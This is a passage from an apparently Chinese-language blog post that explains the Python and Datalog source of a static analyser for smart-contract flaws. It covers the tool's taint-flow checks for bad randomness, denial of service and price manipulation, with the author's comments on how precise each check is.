class="string">&quot;callStmt&quot;</span>] == call_stmt</span><br><span class="line">             ]</span><br><span class="line">             <span class="keyword">if</span> <span class="built_in">len</span>(df_temp) &gt; <span class="number">0</span>:</span><br><span class="line">                 <span class="comment"># find the function that use the itself&#x27;s public func args</span></span><br><span class="line">                 <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df_temp)):</span><br><span class="line">                     <span class="keyword">if</span> <span class="built_in">list</span>(df_temp[<span class="string">&quot;func&quot;</span>])[j] == <span class="built_in">list</span>(df_temp[<span class="string">&quot;pubFun&quot;</span>])[j]:</span><br><span class="line">                         temp_index = <span class="built_in">int</span>(<span class="built_in">list</span>(df_temp[<span class="string">&quot;argIndex&quot;</span>])[j])</span><br><span class="line">                         <span class="keyword">if</span> temp_index <span class="keyword">in</span> self.callArgVals.keys():</span><br><span class="line">                             external_call[<span class="string">&quot;logic_addr&quot;</span>] = self.callArgVals[</span><br><span class="line">                                 temp_index</span><br><span class="line">                             ]</span><br><span class="line">                             logging.info(</span><br><span class="line">                                 <span class="string">&quot;known target vals: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                                     external_call[<span class="string">&quot;logic_addr&quot;</span>]</span><br><span class="line">                                 )</span><br><span class="line">                             )</span><br><span class="line"></span><br><span class="line">         <span class="comment"># record all args (const address, constants, and other env vars (e.g., msg.sender, address(this)))</span></span><br><span class="line">         <span class="keyword">if</span> call_stmt <span class="keyword">in</span> self.knownArgVals.keys():</span><br><span class="line">             external_call[<span class="string">&quot;known_args&quot;</span>] = self.knownArgVals[call_stmt]</span><br><span class="line"></span><br><span class="line">         <span class="comment"># to differentiate the delegatecall and normal call</span></span><br><span class="line">         <span class="keyword">if</span> df_external_call.iloc[i][<span class="string">&quot;callOp&quot;</span>] == <span class="string">&quot;DELEGATECALL&quot;</span>:</span><br><span class="line">             <span class="comment"># the storage addr is still the current addr</span></span><br><span class="line">             external_call[<span class="string">&quot;storage_addr&quot;</span>] = self.logic_addr</span><br><span class="line">             external_call[<span class="string">&quot;caller&quot;</span>] = self.caller</span><br><span class="line">             external_call[<span class="string">&quot;call_site&quot;</span>] = self.call_site</span><br><span class="line">         <span class="keyword">else</span>:</span><br><span class="line">             external_call[<span class="string">&quot;storage_addr&quot;</span>] = external_call[<span class="string">&quot;logic_addr&quot;</span>]</span><br><span class="line">             external_call[<span class="string">&quot;caller&quot;</span>] = self.logic_addr</span><br><span class="line">             external_call[<span class="string">&quot;call_site&quot;</span>] = call_stmt</span><br><span class="line"></span><br><span class="line">         <span class="comment"># label the function signature</span></span><br><span class="line">         <span class="keyword">if</span> <span class="built_in">len</span>(df_fs_const) != <span class="number">0</span>:</span><br><span class="line">             df_temp = df_fs_const.loc[df_fs_const[<span class="string">&quot;callStmt&quot;</span>] == call_stmt]</span><br><span class="line">             <span class="keyword">if</span> <span class="built_in">len</span>(df_temp) &gt; <span class="number">0</span>:</span><br><span class="line">                 external_call[<span class="string">&quot;funcSign&quot;</span>] = <span class="built_in">list</span>(df_temp[<span class="string">&quot;funcSign&quot;</span>])[<span class="number">0</span>][:<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> <span class="built_in">len</span>(df_fs_proxy) != <span class="number">0</span>:</span><br><span class="line">             df_temp = df_fs_proxy.loc[df_fs_proxy[<span class="string">&quot;callStmt&quot;</span>] == call_stmt]</span><br><span class="line">             <span class="keyword">if</span> <span class="built_in">len</span>(df_temp) &gt; <span class="number">0</span>:</span><br><span class="line">                 external_call[<span class="string">&quot;funcSign&quot;</span>] = func_sign</span><br><span class="line">         self.external_calls.append(external_call)</span><br><span class="line"><span class="comment"># 得到对应的调用合约以及函数签名后，保存在self.external_calls中</span></span><br></pre></td></tr></table></figure>
<h2 id="3-flow-analysis-py"><a href="#3-flow-analysis-py" class="headerlink" title="3. flow_analysis.py"></a>3. flow_analysis.py</h2><p>实例化过程传入了合约地址，函数签名，外部调用函数签名，调用路径上的合约以及函数</p>
<p>目前针对 bad_randomness、DOS、reentrancy和price_manipulation四种漏洞进行检测</p>
<h3 id="1）bad-randomness"><a href="#1）bad-randomness" class="headerlink" title="1）bad_randomness"></a>1）bad_randomness</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">intraprocedural_br_analysis</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> self.contracts.keys():</span><br><span class="line">        <span class="keyword">if</span> self.contracts[key].level == <span class="number">0</span>:</span><br><span class="line">            temp_address = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">            temp_funcSign = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">3</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;__function_selector__&quot;</span> <span class="keyword">in</span> key:</span><br><span class="line">                temp_funcSign = <span class="string">&quot;__function_selector__&quot;</span></span><br><span class="line">            loc = (</span><br><span class="line">                global_params.OUTPUT_PATH</span><br><span class="line">                + <span class="string">&quot;.temp/&quot;</span></span><br><span class="line">                + temp_address</span><br><span class="line">                + <span class="string">&quot;/out/Leslie_SensitiveOpOfBadRandomnessAfterExternalCall.csv&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(loc) <span class="keyword">and</span> (os.path.getsize(loc) &gt; <span class="number">0</span>):</span><br><span class="line">                df = pd.read_csv(loc, header=<span class="literal">None</span>, sep=<span class="string">&quot;	&quot;</span>)</span><br><span class="line">                df.columns = [<span class="string">&quot;funcSign&quot;</span>, <span class="string">&quot;callStmt&quot;</span>, <span class="string">&quot;sensitiveVar&quot;</span>, <span class="string">&quot;sourceOp&quot;</span>]</span><br><span class="line">                <span class="comment"># it is not neccessary to label the func, just focus on the callStmt</span></span><br><span class="line">                df = df.loc[df[<span class="string">&quot;funcSign&quot;</span>] == temp_funcSign]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(df) != <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>看了Datalog中<code>Leslie_SensitiveOpOfBadRandomnessAfterExternalCall</code>的实现，感觉这里的检测可能不太准确。</p>
<h3 id="2-DOS"><a href="#2-DOS" class="headerlink" title="2) DOS"></a>2) DOS</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">intraprocedural_dos_analysis</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> self.contracts.keys():</span><br><span class="line">        <span class="keyword">if</span> self.contracts[key].level == <span class="number">0</span>:</span><br><span class="line">            temp_address = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">            temp_funcSign = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">3</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;__function_selector__&quot;</span> <span class="keyword">in</span> key:</span><br><span class="line">                temp_funcSign = <span class="string">&quot;__function_selector__&quot;</span></span><br><span class="line">            loc = (</span><br><span class="line">                global_params.OUTPUT_PATH</span><br><span class="line">                + <span class="string">&quot;.temp/&quot;</span></span><br><span class="line">                + temp_address</span><br><span class="line">                + <span class="string">&quot;/out/Leslie_SensitiveOpOfDoSAfterExternalCall.csv&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(loc) <span class="keyword">and</span> (os.path.getsize(loc) &gt; <span class="number">0</span>):</span><br><span class="line">                df = pd.read_csv(loc, header=<span class="literal">None</span>, sep=<span class="string">&quot;	&quot;</span>)</span><br><span class="line">                df.columns = [</span><br><span class="line">                    <span class="string">&quot;funcSign&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;callStmt&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;callRetVar&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;callRetIndex&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sensitiveVar&quot;</span>,</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># it is not neccessary to label the func, just focus on the callStmt</span></span><br><span class="line">                df = df.loc[df[<span class="string">&quot;funcSign&quot;</span>] == temp_funcSign]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(df) != <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>datalog对应的<code>Leslie_SensitiveOpOfDoSAfterExternalCall</code>规则如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// sensitive operations related to dos</span><br><span class="line">.decl Leslie_SensitiveOpOfDoSAfterExternalCall(funcSign:symbol, callStmt:Statement, callRetVar:Variable, callRetIndex:number, sensitiveVar:Variable)</span><br><span class="line">.output Leslie_SensitiveOpOfDoSAfterExternalCall</span><br><span class="line">Leslie_SensitiveOpOfDoSAfterExternalCall(funcSign, callStmt, callRetVar, callRetIndex, target) :-</span><br><span class="line">  ExternalCall_ActualReturn(callStmt, callRetVar, callRetIndex),</span><br><span class="line">  //捕获特定的外部调用，及其相应的返回变量及索引</span><br><span class="line">  CallToSignature(callStmt, sigText),</span><br><span class="line">  (sigText = &quot;getCurrentRoundInfo(uint256)&quot;;</span><br><span class="line">  sigText = &quot;_getCurrentRoundInfo()&quot;;</span><br><span class="line">  sigText = &quot;getCurrentRoundInfo()&quot;;</span><br><span class="line">  sigText = &quot;getCurrentRoundInfo2()&quot;),</span><br><span class="line">  // 找到函数签名的sigText的签名</span><br><span class="line">  DataFlows(callRetVar, target),</span><br><span class="line">  //判断这样的外部调用返回是否流向一个敏感操作</span><br><span class="line">  // consider the flow</span><br><span class="line">  Leslie_AddressAssertionOp(funcSign, target),</span><br><span class="line">  Leslie_Statement_Function(callStmt, func),</span><br><span class="line">  Leslie_FunctionSelector(func, funcSign).</span><br><span class="line"></span><br><span class="line">.decl Leslie_AddressAssertionOp(funcSign: symbol, addrRet:Variable)</span><br><span class="line">Leslie_AddressAssertionOp(funcSign, addrRet) :-</span><br><span class="line">  //敏感操作的定义</span><br><span class="line">  (EQVars(target,addrRet,res);EQVars(addrRet,target,res)),</span><br><span class="line">  //判断是否有比较或数据流动，指示外部调用的结果如何被用来作为跳转条件的一部分</span><br><span class="line">  // flow to the predicate (tobe used)</span><br><span class="line">  DataFlows(res, predicate),</span><br><span class="line">  JUMPI(stmt,_,predicate),</span><br><span class="line">  //如果断言失败，JUMPI指令会导致合约跳过后续操作</span><br><span class="line">  Leslie_Statement_Function(stmt, func),</span><br><span class="line">  // should be the const or the argument</span><br><span class="line">  Variable_Value(target, val),</span><br><span class="line">  Value_Length(val, len),</span><br><span class="line">  len = 42,</span><br><span class="line">  Leslie_FunctionSelector(func, funcSign).</span><br></pre></td></tr></table></figure>
<p>通过跟踪从外部调用返回的值，检查这些值是否流向了进行关键判断（如地址断言）的操作，代码可以识别可能导致合约执行非预期中断的模式。</p>
<p>这种中断可能因资源耗尽（如无限循环）、执行跳转（如错误处理），或其他异常行为而引起合约服务中断，构成 DoS 漏洞。</p>
<p>但感觉这里的检测也不是很精确。</p>
<h3 id="3）price-manipulation"><a href="#3）price-manipulation" class="headerlink" title="3）price manipulation"></a>3）price manipulation</h3><p>价格操作漏洞的检测与ISSTA2023DefiTainter的检测方法一致</p>
<p>分为两种检测，一是合约内的污点检测，二是跨合约的污点分析</p>
<ul>
<li>intraprocedural_analysis:</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">intraprocedural_analysis</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> self.contracts.keys():</span><br><span class="line">        temp_address = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        temp_funcSign = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">3</span>]</span><br><span class="line">        loc = (</span><br><span class="line">            <span class="string">&quot;./gigahorse-toolchain/.temp/&quot;</span></span><br><span class="line">            + temp_address</span><br><span class="line">            + <span class="string">&quot;/out/Leslie_FLTaintedVarToSensitiveVar.csv&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(loc) <span class="keyword">and</span> (os.path.getsize(loc) &gt; <span class="number">0</span>):</span><br><span class="line">            df = pd.read_csv(loc, header=<span class="literal">None</span>, sep=<span class="string">&quot;	&quot;</span>)</span><br><span class="line">            df.columns = [<span class="string">&quot;funcSign&quot;</span>, <span class="string">&quot;taintedVar&quot;</span>, <span class="string">&quot;sensitiveVar&quot;</span>]</span><br><span class="line">            df = df.loc[df[<span class="string">&quot;funcSign&quot;</span>] == temp_funcSign]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(df) != <span class="number">0</span>:</span><br><span class="line">                log.info(key)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>进入datalog中<code>Leslie_FLTaintedVarToSensitiveVar</code>查看检测细节：</p>
<p>具体逻辑为：</p>
<ul>
<li><p>首先检测<code>balanceOf（）</code>这样外部函数调用的返回值，将其作为攻击者可操控的source，</p>
</li>
<li><p>随后攻击者查看transfer的敏感的调用地址攻击者是否可操控，如果可以的话，那么transfer函数的转账金额就被认为是一个敏感变量</p>
</li>
<li>随后判断source和sink之间是否有对应的传播路径，如果有的话，则认为存在漏洞，保存在对应的csv文件中</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.decl Leslie_FLTaintedVarToSensitiveVar(funcSign:symbol, taintedVar:Variable, sensitiveVar: Variable)</span><br><span class="line">.output Leslie_FLTaintedVarToSensitiveVar</span><br><span class="line">Leslie_FLTaintedVarToSensitiveVar(funcSign, var1, var2):-</span><br><span class="line">  Leslie_FLTaintedVar(funcSign, var1),</span><br><span class="line">  //寻找对应的taint source污点源</span><br><span class="line">  !SLOAD(_, _, var1),</span><br><span class="line">  Leslie_FLSensitiveVar(funcSign, var2),</span><br><span class="line">  //寻找对应的taint sink污点汇--敏感操作</span><br><span class="line">  DataFlows(var1, var2),</span><br><span class="line">  //source和sink之间是否存在对应的路径</span><br><span class="line">  var1 != var2,</span><br><span class="line">  funcSign != &quot;0x70a08231&quot;.</span><br><span class="line">  </span><br><span class="line">  //taint source污点源的定义，这几种函数调用的返回值，一般认为是source源，被认为是攻击者可控的</span><br><span class="line">.decl Leslie_FLTaintedVar(funcSign:symbol, var:Variable)</span><br><span class="line">.output Leslie_FLTaintedVar</span><br><span class="line">Leslie_FLTaintedVar(funcSign, var) :-</span><br><span class="line">  CallToSignature(stmt, &quot;getAmountsIn(uint256,address[])&quot;), //&quot;0x1f00ca74&quot;,</span><br><span class="line">  ExternalCall_ActualReturn(stmt, var, _),</span><br><span class="line">  Leslie_Statement_Function(stmt, func),</span><br><span class="line">  PublicFunctionSelector(func, funcSign).</span><br><span class="line"></span><br><span class="line">Leslie_FLTaintedVar(funcSign, var) :-</span><br><span class="line">  CallToSignature(stmt, &quot;getAmountsOut(uint256,address[])&quot;), //&quot;0xd06ca61f&quot;</span><br><span class="line">  ExternalCall_ActualReturn(stmt, var, _),</span><br><span class="line">  Leslie_Statement_Function(stmt, func),</span><br><span class="line">  PublicFunctionSelector(func, funcSign).</span><br><span class="line"></span><br><span class="line">Leslie_FLTaintedVar(funcSign, var) :-</span><br><span class="line">  CallToSignature(stmt, &quot;balanceOf(address)&quot;),</span><br><span class="line">  ExternalCall_ActualReturn(stmt, var, 0),</span><br><span class="line">  Leslie_Statement_Function(stmt, func),</span><br><span class="line">  PublicFunctionSelector(func, funcSign).</span><br><span class="line"></span><br><span class="line">// getreserves() in the victim&#x27;s context tainted source</span><br><span class="line">Leslie_FLTaintedVar(funcSign, var) :-</span><br><span class="line">  CallToSignature(stmt, &quot;getReserves()&quot;),</span><br><span class="line">  ExternalCall_ActualReturn(stmt, var, _),</span><br><span class="line">  Leslie_Statement_Function(stmt, func),</span><br><span class="line">  PublicFunctionSelector(func, funcSign).</span><br><span class="line">  </span><br><span class="line">.decl Leslie_FLSensitiveVar(funcSign:symbol, amount:Variable)</span><br><span class="line">Leslie_FLSensitiveVar(funcSign, amount) :- </span><br><span class="line">  Leslie_FLSensitiveCall(stmt, recipient, amount),</span><br><span class="line">  //是否存在transfer这样的敏感调用</span><br><span class="line">  (PublicFunctionArg(_, var, _);CALLER(_, var);ORIGIN(_, var)), // manipulated by the caller</span><br><span class="line">  //找到被攻击者操控的变量</span><br><span class="line">  DataFlows(var, recipient),</span><br><span class="line">  //查看敏感操作与操控变量间是否有数据流，有的话，就认为tranfer的余额是一个敏感变量</span><br><span class="line">  Leslie_Statement_Function(stmt, func),</span><br><span class="line">  PublicFunctionSelector(func, funcSign).</span><br><span class="line">  </span><br><span class="line">//判断tranfer函数调用中是否包含敏感操作，这里找到对应的transfer函数调用，并找到对应的接收者</span><br><span class="line">.decl Leslie_FLSensitiveCall(callStmt:Statement, var:Variable, target:Variable)</span><br><span class="line">.output Leslie_FLSensitiveCall</span><br><span class="line">Leslie_FLSensitiveCall(callStmt, recipient, amount) :-</span><br><span class="line">  CallToSignature(callStmt, &quot;transfer(address,uint256)&quot;),</span><br><span class="line">  StatementUsesMemory_ActualMemoryArg(callStmt, _, 1, recipient),</span><br><span class="line">  StatementUsesMemory_ActualMemoryArg(callStmt, _, 2, amount).</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>interprocedural_analysis:</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    pps_near_fl_source = self.get_pps_near_fl_source()</span><br><span class="line">    pps_near_fl_sink = self.get_pps_near_fl_sink()</span><br><span class="line">    self.attack_matrix[<span class="string">&quot;price_manipulation&quot;</span>] = (</span><br><span class="line">        self.find_potential_price_manipulation_attack(</span><br><span class="line">            pps_near_fl_source, pps_near_fl_sink</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="comment"># trace vulnerable flashloan-related flow</span></span><br><span class="line"><span class="comment"># 保存相应的被taint source污染的函数返回值，以及调用参数对应的信息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pps_near_fl_source</span>(<span class="params">self</span>):</span><br><span class="line">    pps_near_source = []</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> self.contracts.keys():</span><br><span class="line">        temp_caller = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        temp_callsite = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        temp_address = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        temp_funcSign = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">        temp_indexes = self.get_fl_tainted_ret(temp_address, temp_funcSign)</span><br><span class="line">        <span class="comment">#  通过对应的合约地址和函数签名，获得函数中taint source污染的返回值，对应的返回值index</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(temp_indexes) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> temp_index <span class="keyword">in</span> temp_indexes:</span><br><span class="line">                pps_near_source.append(</span><br><span class="line">                    self.new_pp(</span><br><span class="line">                        temp_caller,</span><br><span class="line">                        temp_callsite,</span><br><span class="line">                        temp_address,</span><br><span class="line">                        temp_funcSign,</span><br><span class="line">                        temp_index,</span><br><span class="line">                        self.contracts[key].func_sign,</span><br><span class="line">                        <span class="string">&quot;func_ret&quot;</span>,</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">				<span class="comment">#         找到程序当前的地址</span></span><br><span class="line">                <span class="comment"># log.info(&quot;found tainted ret in contract: &quot; + temp_address)</span></span><br><span class="line"></span><br><span class="line">        temp_call_args = self.get_fl_tainted_call_args(temp_address, temp_funcSign)</span><br><span class="line">        <span class="comment"># 找到对应的函数中，taint source污染的函数调用参数，保存对应的函数调用stmt和对应的参数index</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(temp_call_args) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> temp_call_arg <span class="keyword">in</span> temp_call_args:</span><br><span class="line">                (</span><br><span class="line">                    temp_external_call_caller,</span><br><span class="line">                    temp_external_call_logic_addr,</span><br><span class="line">                    temp_external_call_func_sign,</span><br><span class="line">                ) = self.get_external_call_info(</span><br><span class="line">                    temp_call_arg[<span class="string">&quot;callStmt&quot;</span>], self.contracts[key].external_calls</span><br><span class="line">                )</span><br><span class="line">                <span class="comment"># 返回对应的外部调用信息</span></span><br><span class="line">                pps_near_source.append(</span><br><span class="line">                    self.new_pp(</span><br><span class="line">                        temp_external_call_caller,</span><br><span class="line">                        temp_call_arg[<span class="string">&quot;callStmt&quot;</span>],</span><br><span class="line">                        temp_external_call_logic_addr,</span><br><span class="line">                        temp_external_call_func_sign,</span><br><span class="line">                        temp_call_arg[<span class="string">&quot;callArgIndex&quot;</span>],</span><br><span class="line">                        self.contracts[key].func_sign,</span><br><span class="line">                        <span class="string">&quot;call_arg&quot;</span>,</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                <span class="comment"># 保存对应的污点污染的信息</span></span><br><span class="line">                <span class="comment"># log.info(&quot;found tainted call arg in contract: &quot; + temp_address)</span></span><br><span class="line">    log.info(pps_near_source)</span><br><span class="line">    <span class="keyword">return</span> pps_near_source</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存相应的受到sink传播影响的敏感操作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pps_near_fl_sink</span>(<span class="params">self</span>):</span><br><span class="line">    pps_near_sink = []</span><br><span class="line">    known_args = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> self.contracts.keys():</span><br><span class="line">        temp_caller = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        temp_callsite = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        temp_address = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        temp_funcSign = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">3</span>]</span><br><span class="line">        <span class="comment"># the function that sink site lies in</span></span><br><span class="line">        temp_caller_funcSign = key.split(<span class="string">&quot;_&quot;</span>)[<span class="number">4</span>]</span><br><span class="line">        <span class="comment"># log.info(temp_caller_funcSign)</span></span><br><span class="line">        <span class="comment"># get the taint sink: function arguments of the call arg to callee address</span></span><br><span class="line">        temp_call_args = self.fl_get_callsites_flow_to_sink(</span><br><span class="line">            temp_address, temp_funcSign</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 找到对应的函数调用返回值的index，该函数返回值是与taint sink之间是可达的</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(temp_call_args) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> temp_call_arg <span class="keyword">in</span> temp_call_args:</span><br><span class="line">                (</span><br><span class="line">                    temp_external_call_caller,</span><br><span class="line">                    temp_external_call_logic_addr,</span><br><span class="line">                    temp_external_call_func_sign,</span><br><span class="line">                ) = self.get_external_call_info(</span><br><span class="line">                    temp_call_arg[<span class="string">&quot;callStmt&quot;</span>], self.contracts[key].external_calls</span><br><span class="line">                )</span><br><span class="line">                <span class="comment">## 返回对应外部调用的调用信息</span></span><br><span class="line">                pps_near_sink.append(</span><br><span class="line">                    self.new_pp(</span><br><span class="line">                        temp_external_call_caller,</span><br><span class="line">                        temp_call_arg[<span class="string">&quot;callStmt&quot;</span>],</span><br><span class="line">                        temp_external_call_logic_addr,</span><br><span class="line">                        temp_external_call_func_sign,</span><br><span class="line">                        temp_call_arg[<span class="string">&quot;callRetIndex&quot;</span>],</span><br><span class="line">                        <span class="comment"># bug fixed</span></span><br><span class="line">                        self.contracts[key].func_sign,</span><br><span class="line">                        <span class="string">&quot;func_ret&quot;</span>,</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                <span class="comment"># add a sink as the transfer target</span></span><br><span class="line">                <span class="comment"># target = self.get_sensitive_call_from_call_ret(</span></span><br><span class="line">                <span class="comment">#     temp_call_arg[&quot;callStmt&quot;], temp_external_call_caller</span></span><br><span class="line">                <span class="comment"># )</span></span><br><span class="line">                <span class="comment"># known_args[temp_call_arg[&quot;callStmt&quot;]] = (</span></span><br><span class="line">                <span class="comment">#     self.get_external_call_known_arg_info(</span></span><br><span class="line">                <span class="comment">#         temp_call_arg[&quot;callStmt&quot;],</span></span><br><span class="line">                <span class="comment">#         self.contracts[key].external_calls,</span></span><br><span class="line">                <span class="comment">#     )[temp_call_arg[&quot;callStmt&quot;]]</span></span><br><span class="line">                <span class="comment"># )</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># log.info(&quot;====sink====&quot;)</span></span><br><span class="line">			<span class="comment">##   找到对应污点sink，依赖的变量，其为外部可操控的函数调用返回值</span></span><br><span class="line">            <span class="comment"># notice: the &#x27;caller_funcsign&#x27; is the function that call the victim to call the &#x27;funcsign&#x27; in the attack contract</span></span><br><span class="line">    log.info(pps_near_sink)</span><br><span class="line">    <span class="comment"># get the functions called by victim (possible)</span></span><br><span class="line">    <span class="keyword">return</span> pps_near_sink</span><br></pre></td></tr></table></figure>
<p>得到了对应source所污染的函数参数和函数返回值，和sink所依赖的函数调用返回值，依据上述的source和sink，分析对应的rule：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">def</span> <span class="title function_">find_potential_price_manipulation_attack</span>(<span class="params">self, source, sink</span>):</span><br><span class="line">       reachable = <span class="literal">False</span></span><br><span class="line">       is_pm_attack = <span class="literal">False</span></span><br><span class="line">       <span class="keyword">for</span> pp1 <span class="keyword">in</span> source:</span><br><span class="line">           <span class="keyword">for</span> pp2 <span class="keyword">in</span> sink:</span><br><span class="line">               <span class="keyword">if</span> self.is_same(pp1, pp2):</span><br><span class="line">                   reachable = <span class="literal">True</span></span><br><span class="line">                   is_pm_attack = <span class="literal">True</span></span><br><span class="line">               <span class="keyword">elif</span> self.is_reachable(pp1, pp2):</span><br><span class="line">                   reachable = <span class="literal">True</span></span><br><span class="line">                   is_pm_attack = <span class="literal">True</span></span><br><span class="line">       <span class="keyword">if</span> is_pm_attack:</span><br><span class="line">           log.info(<span class="string">&quot;price manipulation&quot;</span>)</span><br><span class="line">       <span class="keyword">return</span> reachable</span><br><span class="line"><span class="comment"># 如果source污染的函数返回值和sink敏感操作依赖的函数返回值为同一个变量</span></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">is_same</span>(<span class="params">self, pp1, pp2</span>):</span><br><span class="line">       pp1_str = (</span><br><span class="line">           pp1[<span class="string">&quot;caller&quot;</span>]</span><br><span class="line">           + <span class="string">&quot;_&quot;</span></span><br><span class="line">           + pp1[<span class="string">&quot;callsite&quot;</span>]</span><br><span class="line">           + <span class="string">&quot;_&quot;</span></span><br><span class="line">           + pp1[<span class="string">&quot;func_sign&quot;</span>]</span><br><span class="line">           + <span class="string">&quot;_&quot;</span></span><br><span class="line">           + <span class="built_in">str</span>(pp1[<span class="string">&quot;index&quot;</span>])</span><br><span class="line">           + <span class="string">&quot;_&quot;</span></span><br><span class="line">           + pp1[<span class="string">&quot;type&quot;</span>]</span><br><span class="line">           + <span class="string">&quot;_&quot;</span></span><br><span class="line">           + pp1[<span class="string">&quot;caller_funcSign&quot;</span>]</span><br><span class="line">       )</span><br><span class="line">       pp2_str = (</span><br><span class="line">           pp2[<span class="string">&quot;caller&quot;</span>]</span><br><span class="line">           + <span class="string">&quot;_&quot;</span></span><br><span class="line">           + pp2[<span class="string">&quot;callsite&quot;</span>]</span><br><span class="line">           + <span class="string">&quot;_&quot;</span></span><br><span class="line">           + pp2[<span class="string">&quot;func_sign&quot;</span>]</span><br><span class="line">           + <span class="string">&quot;_&quot;</span></span><br><span class="line">           + <span class="built_in">str</span>(pp2[<span class="string">&quot;index&quot;</span>])</span><br><span class="line">           + <span class="string">&quot;_&quot;</span></span><br><span class="line">           + pp2[<span class="string">&quot;type&quot;</span>]</span><br><span class="line">           + <span class="string">&quot;_&quot;</span></span><br><span class="line">           + pp2[<span class="string">&quot;caller_funcSign&quot;</span>]</span><br><span class="line">       )</span><br><span class="line">       <span class="keyword">if</span> pp1_str == pp2_str:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">is_reachable</span>(<span class="params">self, pp1, pp2</span>):</span><br><span class="line">       <span class="keyword">if</span> self.is_same(pp1, pp2):</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">       pending = [pp1]</span><br><span class="line">       <span class="keyword">while</span> <span class="built_in">len</span>(pending) &gt; <span class="number">0</span>:</span><br><span class="line">           temp_pp = pending.pop()</span><br><span class="line">           <span class="keyword">for</span> pp <span class="keyword">in</span> self.transfer(temp_pp):</span><br><span class="line">               <span class="comment">## 判断是否有tainted source到sink的路径</span></span><br><span class="line">               <span class="keyword">if</span> self.is_same(pp, pp2):</span><br><span class="line">                   <span class="comment"># log.info(pp)</span></span><br><span class="line">                   